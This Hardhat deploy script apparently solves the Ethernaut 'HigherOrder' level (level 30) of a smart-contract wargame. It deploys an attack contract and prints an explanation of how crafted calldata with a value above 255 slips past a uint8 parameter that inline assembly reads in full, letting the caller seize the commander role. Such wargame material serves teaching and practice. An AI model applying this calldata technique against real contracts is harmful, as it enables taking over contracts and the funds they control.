import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";
import { isLocalNetwork } from "../utils/network-config";

/**
 * Deploys the HigherOrderAttack solution for Ethernaut level 30
 * 
 * To deploy with a specific HigherOrder address:
 * HIGHER_ORDER_ADDRESS=0xYourAddress npx hardhat deploy --tags higher-order-solution --network sepolia
 *
 * @param hre HardhatRuntimeEnvironment object
 */
const deployHigherOrderSolution: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployments, getNamedAccounts, network, run, ethers } = hre;
  const { deploy } = deployments;
  const { deployer } = await getNamedAccounts();
  const chainId = network.config.chainId || 31337;

  console.log("Deploying HigherOrderAttack solution contract with account:", deployer);

  // Get HigherOrder address from environment or from previous deployment
  let higherOrderAddress = process.env.HIGHER_ORDER_ADDRESS;

  if (!higherOrderAddress) {
    console.log("HIGHER_ORDER_ADDRESS not provided, fetching from deployments...");
    
    const higherOrderDeployment = await deployments.getOrNull("HigherOrder");

    if (higherOrderDeployment) {
      higherOrderAddress = higherOrderDeployment.address;
      console.log(`  HigherOrder: ${higherOrderAddress}`);
    } else {
      throw new Error("Please provide HIGHER_ORDER_ADDRESS environment variable or deploy the instance contract first");
    }
  }

  // Deploy the HigherOrderAttack contract
  const attackContract = await deploy("HigherOrderAttack", {
    from: deployer,
    args: [higherOrderAddress],
    log: true,
    autoMine: true,
    waitConfirmations: !isLocalNetwork(chainId) ? 5 : 0,
  });

  console.log("HigherOrderAttack deployed to:", attackContract.address);
  console.log("  Target HigherOrder:", higherOrderAddress);

  // Get contract instances to display current state
  const higherOrderContract = await ethers.getContractAt("HigherOrder", higherOrderAddress);
  const attackContractInstance = await ethers.getContractAt("HigherOrderAttack", attackContract.address);
  
  const treasury = await higherOrderContract.treasury();
  const commander = await higherOrderContract.commander();
  const selector = await attackContractInstance.getRegisterTreasurySelector();
  const state = await attackContractInstance.checkState();

  console.log("\n=== Current State ===");
  console.log(`HigherOrder: ${higherOrderAddress}`);
  console.log(`Treasury: ${treasury}`);
  console.log(`Commander: ${commander}`);
  console.log(`Can Claim Leadership: ${state.canClaim}`);
  console.log(`Attack Contract: ${attackContract.address}`);

  console.log("\n=== Function Selectors ===");
  console.log(`registerTreasury(uint8): ${selector}`);

  console.log("\n=== Attack Strategy ===");
  console.log("The exploit leverages a mismatch between function signature and implementation:");
  console.log("");
  console.log("1. The Vulnerability:");
  console.log("   ┌─────────────────────────────────────────────────┐");
  console.log("   │ Function Signature                              │");
  console.log("   │ function registerTreasury(uint8) public         │");
  console.log("   │   - Expects values 0-255                        │");
  console.log("   │   - ABI encoding enforces uint8 range           │");
  console.log("   └─────────────────────────────────────────────────┘");
  console.log("   ┌─────────────────────────────────────────────────┐");
  console.log("   │ Assembly Implementation                         │");
  console.log("   │ assembly {                                      │");
  console.log("   │     sstore(treasury_slot, calldataload(4))      │");
  console.log("   │ }                                               │");
  console.log("   │   - Reads full 32 bytes from calldata           │");
  console.log("   │   - No validation of uint8 constraint           │");
  console.log("   └─────────────────────────────────────────────────┘");
  console.log("");
  console.log("2. Normal ABI-Encoded Call:");
  console.log("   interface.registerTreasury(255)");
  console.log("   ├─ Calldata: selector + 0x00...00ff");
  console.log("   ├─ Assembly reads: 0x00...00ff (255)");
  console.log("   └─ Result: treasury = 255 ❌ (not > 255)");
  console.log("");
  console.log("3. Low-Level Call with Crafted Calldata:");
  console.log("   bytes memory data = abi.encodePacked(selector, uint256(256))");
  console.log("   address(target).call(data)");
  console.log("   ├─ Calldata: selector + 0x00...0100");
  console.log("   ├─ Assembly reads: 0x00...0100 (256)");
  console.log("   └─ Result: treasury = 256 ✅ (> 255!)");
  console.log("");
  console.log("4. Claim Leadership:");
  console.log("   if (treasury > 255) commander = msg.sender;");
  console.log("   └─ Condition met! Become the Commander!");

  console.log("\n=== Calldata Breakdown ===");
  const maliciousCalldata = await attackContractInstance.craftMaliciousCalldata(256);
  console.log("Crafted Calldata:", maliciousCalldata);
  console.log("");
  console.log("Structure:");
  console.log("  Bytes 0-3:   Function selector (registerTreasury)");
  console.log("  Bytes 4-35:  Value as uint256 (256)");
  console.log("");
  console.log("When executed:");
  console.log("  1. calldataload(4) reads bytes 4-35");
  console.log("  2. Gets full 32-byte value: 256");
  console.log("  3. Stores in treasury slot: treasury = 256");
  console.log("  4. Bypasses uint8 restriction! ✓");

  console.log("\n=== Why This Works ===");
  console.log("• Function signatures are just ABI interfaces");
  console.log("• Assembly operates on raw calldata bytes");
  console.log("• calldataload(offset) always reads 32 bytes");
  console.log("• No type checking in assembly - reads what's there");
  console.log("• We control the calldata, so we can put any value!");

  console.log("\n=== Compiler Version Issue ===");
  console.log("• Contract uses Solidity 0.6.12 (older compiler)");
  console.log("• Older compilers: less strict about assembly safety");
  console.log("• Modern compilers: better warnings and checks");
  console.log("• But low-level calls can still bypass type safety!");

  // Verify the contract on non-local networks
  if (!isLocalNetwork(chainId) && process.env.ETHERSCAN_API_KEY) {
    console.log("\nWaiting for blockchain indexers to catch up...");
    await new Promise(resolve => setTimeout(resolve, 60000)); // 60 seconds delay
    
    console.log("Verifying HigherOrderAttack contract on Etherscan...");
    try {
      await run("verify:verify", {
        address: attackContract.address,
        constructorArguments: [higherOrderAddress],
      });
      console.log("Contract verification successful!");
    } catch (error: any) {
      if (error.message.includes("Already Verified")) {
        console.log("Contract is already verified!");
      } else if (error.message.includes("does not have bytecode")) {
        console.log("Verification failed: Contract bytecode not found on the explorer yet.");
        console.log("You can manually verify later.");
      } else {
        console.error("Verification failed:", error);
      }
    }
  }
  
  console.log("\n----------------------------------------------------");
  console.log("📝 Next Steps:");
  console.log("1. Execute the attack using:");
  console.log(`   ATTACK_CONTRACT_ADDRESS=${attackContract.address} TARGET_ADDRESS=${higherOrderAddress} npx hardhat run scripts/level-30-higher-order/attack.ts --network ${network.name}`);
  console.log("\n2. This will:");
  console.log("   - Craft calldata with value > 255");
  console.log("   - Make low-level call to registerTreasury");
  console.log("   - Claim leadership to become Commander!");
  console.log("----------------------------------------------------");
};

export default deployHigherOrderSolution;

// Tags help to select which deploy script to run
deployHigherOrderSolution.tags = ["level-30", "higher-order-solution"];

// Only add dependency if we're not using provided address
if (!process.env.HIGHER_ORDER_ADDRESS) {
  // This script depends on the HigherOrder contract being deployed first
  deployHigherOrderSolution.dependencies = ["higher-order"];
}
